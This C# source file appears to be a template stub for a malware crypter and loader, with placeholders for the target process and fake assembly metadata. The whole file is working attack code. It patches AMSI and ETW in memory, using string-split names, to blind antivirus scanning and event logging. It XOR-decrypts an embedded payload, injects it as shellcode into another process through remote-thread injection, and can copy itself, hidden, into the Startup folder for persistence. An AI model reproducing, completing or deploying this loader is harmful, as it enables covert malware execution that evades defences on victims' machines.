using System;
using System.Diagnostics;
using System.Linq;
using System.Threading;
using System.Runtime.InteropServices;
using System.IO;
using System.Text;
using System.Reflection;

#if UseAssembly
[assembly: AssemblyTitle("%TITLE%")]
[assembly: AssemblyDescription("%DESC%")]
[assembly: AssemblyCompany("%COMPANY%")]
[assembly: AssemblyProduct("%PRODUCT%")]
[assembly: AssemblyCopyright("%COPYRIGHT%")]
[assembly: AssemblyTrademark("%TRADEMARK%")]
[assembly: AssemblyVersion("%VERSION%")]
[assembly: AssemblyFileVersion("%FILE_VERSION%")]
#endif

namespace DaVinCi
{
    class MonaLiza
    {
        static void Main(string[] args)
        {
            Thread.Sleep(6000);
            Runtime.Run();
        }
    }

    #region Runtime
    class Runtime
    {
        public static void Run()
        {
            Loader.AmsiPatch();
            Loader.EtwPatch();
#if UseAutorun
            ProcessManager.AutoRun();
#endif

            byte[] Payload = Decryptor.Run(Config.Payload, Config.Key);

            if (Payload != null || Payload.Length != 0)
            {
                int ProcId = ProcessManager.GetOrStartProcess(Config.Proc);
                if (ProcId > 0)
                {
                    Loader.Execute(Payload, ProcId);
                }
            }
        }
    }
#endregion

    #region Config
    class Config
    {
        public static byte[] Payload = new byte[] { };

        public static byte[] Key = new byte[] { };

        public static string Proc = "%process_to_inject%";
    }
    #endregion

    #region Decryptor
    public class Decryptor
    {
        public static byte[] Run(byte[] payload, byte[] key)
        {
            byte[] decryptedBytes = new byte[payload.Length];

            for (int i = 0; i < payload.Length; i++)
            {
                decryptedBytes[i] = (byte)(payload[i] ^ key[i % key.Length]);
            }

            return decryptedBytes;
        }
    }
    #endregion

    #region ProcessManager
    public static class ProcessManager
    {
#if UseAutorun
        public static void AutoRun()
        {
            string currentAppPath = Process.GetCurrentProcess().MainModule.FileName;
            string TargetPath =
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), Path.GetFileName(currentAppPath));
            
            if (!File.Exists(TargetPath))
            {
                File.Copy(currentAppPath, TargetPath);
                FileAttributes attributes = File.GetAttributes(TargetPath);

                if ((attributes & FileAttributes.Hidden) != FileAttributes.Hidden)
                {
                    File.SetAttributes(TargetPath, attributes | FileAttributes.Hidden);
                }
            }
        }
#endif

        public static int GetOrStartProcess(string processPathOrName)
        {
            bool isFullPath = processPathOrName.Contains("\\") || processPathOrName.Contains("/");
            string processName = isFullPath ? Path.GetFileNameWithoutExtension(processPathOrName) : processPathOrName;

            Process[] processes = Process.GetProcesses();
            for (int i = 0; i < processes.Length; i++)
            {
                try
                {
                    if (isFullPath)
                    {
                        if (processes[i].MainModule != null && string.Equals(processes[i].MainModule.FileName, processPathOrName, StringComparison.OrdinalIgnoreCase))
                        {
                            return processes[i].Id;
                        }
                    }
                    else
                    {
                        if (string.Equals(processes[i].ProcessName, processName, StringComparison.OrdinalIgnoreCase))
                        {
                            return processes[i].Id;
                        }
                    }
                }
                catch
                {

                }
            }

            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo(processPathOrName);
                startInfo.UseShellExecute = true;
                startInfo.CreateNoWindow = true;
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;

                Process newProcess = Process.Start(startInfo);
                if (newProcess != null)
                {
                    return newProcess.Id;
                }
            }
            catch { }
            return -1;
        }
    }

#endregion

    #region Loader
    public class Loader
    {
        [DllImport("kernel32", SetLastError = true)]
        private static extern IntPtr LoadLibraryA(string name);

        [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr GetProcAddress(IntPtr hProcess, string name);

        [DllImport("kernel32", SetLastError = true)]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        internal static CreateApi Load<CreateApi>(string name, string method)
        {
            IntPtr hLibrary = LoadLibraryA(name);
            if (hLibrary == IntPtr.Zero)
            {
                throw new InvalidOperationException("err :) -1");
            }

            IntPtr procAddress = GetProcAddress(hLibrary, method);
            if (procAddress == IntPtr.Zero)
            {
                throw new InvalidOperationException("err :) -1");
            }

            return (CreateApi)(object)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(CreateApi));
        }

        internal delegate IntPtr DelegateOpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        internal delegate IntPtr DelegateVirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        internal delegate bool DelegateWriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, IntPtr nSize, out uint lpNumberOfBytesWritten);
        internal delegate bool DelegateVirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        internal delegate IntPtr DelegateCreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        internal delegate bool DelegateCloseHandle(IntPtr hObject);

        internal static readonly DelegateOpenProcess OpenProcess = Load<DelegateOpenProcess>("kernel32", "OpenProcess");
        internal static readonly DelegateVirtualAllocEx VirtualAllocEx = Load<DelegateVirtualAllocEx>("kernel32", "VirtualAllocEx");
        internal static readonly DelegateWriteProcessMemory WriteProcessMemory = Load<DelegateWriteProcessMemory>("kernel32", "WriteProcessMemory");
        internal static readonly DelegateVirtualProtectEx VirtualProtectEx = Load<DelegateVirtualProtectEx>("kernel32", "VirtualProtectEx");
        internal static readonly DelegateCreateRemoteThread CreateRemoteThread = Load<DelegateCreateRemoteThread>("kernel32", "CreateRemoteThread");
        internal static readonly DelegateCloseHandle CloseHandle = Load<DelegateCloseHandle>("kernel32", "CloseHandle");

        private const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
        private const uint MEM_COMMIT = 0x1000;
        private const uint PAGE_EXECUTE_READWRITE = 0x40;

        internal static void Execute(byte[] shellcode, int processID)
        {
            IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, (uint)processID);
            if (hProcess == IntPtr.Zero)
            {
                throw new InvalidOperationException("err :) -1");
            }

            IntPtr virtualAlloc = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            if (virtualAlloc == IntPtr.Zero)
            {
                throw new InvalidOperationException("err :) -1");
            }

            uint bytesWritten;
            if (!WriteProcessMemory(hProcess, virtualAlloc, shellcode, (IntPtr)shellcode.Length, out bytesWritten))
            {
                throw new InvalidOperationException("err :) -1");
            }

            CreateRemoteThread(hProcess, IntPtr.Zero, 0, virtualAlloc, IntPtr.Zero, 0, IntPtr.Zero);
            CloseHandle(hProcess);
        }

        public static void AmsiPatch()
        {
            IntPtr library = LoadLibraryA("a" + "m" + "s" + "i" + "." + "d" + "l" + "l");
            IntPtr address = GetProcAddress(library, "A" + "m" + "s" + "i" + "S" + "c" + "a" + "n" + "B" + "u" + "f" + "f" + "e" + "r");
            if (address == IntPtr.Zero)
            {
                throw new InvalidOperationException("err :) -1");
            }

            uint oldProtect;
            if (!VirtualProtect(address, (UIntPtr)5, 0x40, out oldProtect))
            {
                throw new InvalidOperationException("err :) -1");
            }

            byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            Marshal.Copy(patch, 0, address, patch.Length);
        }

        public static void EtwPatch()
        {
            byte[] PatchBytes = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            try
            {
                IntPtr ntdllLibrary = LoadLibraryA("n" + "t" + "d" + "l" + "l" + "." + "d" + "l" + "l");
                IntPtr EventName = GetProcAddress(ntdllLibrary, "Et" + "wE" + "ve" + "nt" + "Wr" + "it" + "e");
                if (EventName == IntPtr.Zero)
                {
                    throw new InvalidOperationException("err -1 :)");
                }

                uint previousProtection;
                if (!VirtualProtect(EventName, (UIntPtr)PatchBytes.Length, 0x40, out previousProtection))
                {
                    throw new InvalidOperationException("err -1 :)");
                }

                Marshal.Copy(PatchBytes, 0, EventName, PatchBytes.Length);
            }
            catch { }
        }
    }
    #endregion
}
